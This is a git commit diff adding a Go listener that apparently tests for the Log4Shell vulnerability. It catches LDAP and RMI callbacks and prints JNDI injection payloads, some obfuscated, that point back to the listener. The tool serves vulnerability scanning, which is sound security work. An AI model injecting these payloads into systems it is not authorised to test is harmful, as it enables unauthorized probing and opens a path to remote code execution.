1a7aa4a656dcee3fb233a69c4cad56523c81d425
SaiRson <74412075+sairson@users.noreply.github.com>
2021-12-24 10:38:23 +0800

    Add files via upload

---
+++ log4j/go.mod
@@ -0,0 +1,3 @@
+module log4j
+
+go 1.16
--- log4j/log4j.go
+++ log4j/log4j.go
@@ -7,6 +7,11 @@ import (
 	"os"
 	"os/signal"
 	"syscall"
+	"strconv"
+)
+
+const (
+	Clearln   = "\r\x1b[2K"
 )
 
 var (
@@ -15,45 +20,78 @@ var (
 )
 
 func main() {
-	go runListener()
-	c := make(chan os.Signal, 1)
-	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
-
-	fmt.Println("Press ctrl+c to shutdown")
-	<- c
-	fmt.Println("ctrl+c detected. Shutting down")
+		fmt.Println(Clearln + "Press ctrl+c to shutdown")
+		go 	Log4jCheckServer(*ConnHost,strconv.Itoa(*ConnPort))
+		c := make(chan os.Signal,1)
+		signal.Notify(c,os.Interrupt,syscall.SIGTERM)
+		<- c
+		fmt.Println(Clearln + "ctrl+c detected. Shutting down")
 }
 
-func runListener() {
-	flag.Parse()
-	// Listen for incoming connections.
-	host, port := *ConnHost, *ConnPort
-	address := fmt.Sprintf("%s:%d", host, port)
-	l, err := net.Listen("tcp", address)
+func Log4j2HandleRequest(conn net.Conn){
+	defer conn.Close()
+	buf := make([]byte,1024)
+	num, err := conn.Read(buf)
 	if err != nil {
-		fmt.Println("Error listening:", err.Error())
-		os.Exit(1)
+		fmt.Println(Clearln + "accept data reading err",err)
+		_ =  conn.Close()
+		return
 	}
-	// Close the listener when the application closes.
-	defer l.Close()
-	fmt.Println("Listening on " + address)
-	fmt.Println(fmt.Sprintf("[vuln-test] ${jndi:ldap://%v/poc}",address))
-	for {
-		// Listen for an incoming connection.
-		conn, err := l.Accept()
-		if err != nil {
-			fmt.Println("Error accepting: ", err.Error())
-			os.Exit(1)
-		}
-		// Handle connections in a new goroutine.
-		go handleRequest(conn)
+	hexStr := fmt.Sprintf("%x",buf[:num])
+	// LDAP 协议
+	if "300c020101600702010304008000" == hexStr {
+		fmt.Println(fmt.Sprintf("[LDAP] %s Finger:%s",conn.RemoteAddr().String(),hexStr))
+		return
+	}
+	if RMI(buf) {
+		fmt.Println(fmt.Sprintf("[RMI] %s Finger:%x",conn.RemoteAddr().String(),buf[0:7]))
+		return
 	}
 }
 
-// Handles incoming requests.
-func handleRequest(conn net.Conn) {
-	fmt.Println("[vulnerability]",conn.RemoteAddr())
+//TODO: https://github.com/KpLi0rn/Log4j2Scan/blob/main/core/server.go
 
-	// Close the connection immediately
-	conn.Close()
+func RMI(data []byte) bool {
+	if data[0] == 0x4a && data[1] == 0x52 && data[2] == 0x4d && data[3] == 0x49 {
+		if data[4] != 0x00 {
+			return false
+		}
+		if data[5] != 0x01 && data[5] != 0x02 {
+			return false
+		}
+		if data[6] != 0x4b && data[6] != 0x4c && data[6] != 0x4d {
+			return false
+		}
+		lastData := data[7:]
+		for _, v := range lastData {
+			if v != 0x00 {
+				return false
+			}
+		}
+		return true
+	}
+	return false
+}
+
+func Log4jCheckServer(host string,port string){
+	listen, err := net.Listen("tcp",fmt.Sprintf("%s:%s",host,port))
+	if err != nil {
+		fmt.Println(Clearln + "log4j listen server failed")
+		return
+	}
+	defer listen.Close()
+	//fmt.Println(fmt.Sprintf("[Log4j2] Listen start on %s:%s",host,port))
+	fmt.Println(Clearln + "[payload]: ")
+	fmt.Println(fmt.Sprintf(Clearln + "==> ${${lower:${lower:jndi}}:${lower:ldap}://%v:%v/poc}",host,port))
+	fmt.Println(fmt.Sprintf(Clearln + "==> ${${::-j}ndi:rmi://%v:%v/poc}",host,port))
+	fmt.Println(fmt.Sprintf(Clearln + "==> ${jndi:ldap://%v:%v/poc}",host,port))
+	fmt.Println("-----------------------------------")
+	for {
+		conn, err := listen.Accept()
+		if err != nil {
+			fmt.Println(Clearln + "accept failed",err)
+			continue
+		}
+		go Log4j2HandleRequest(conn)
+	}
 }
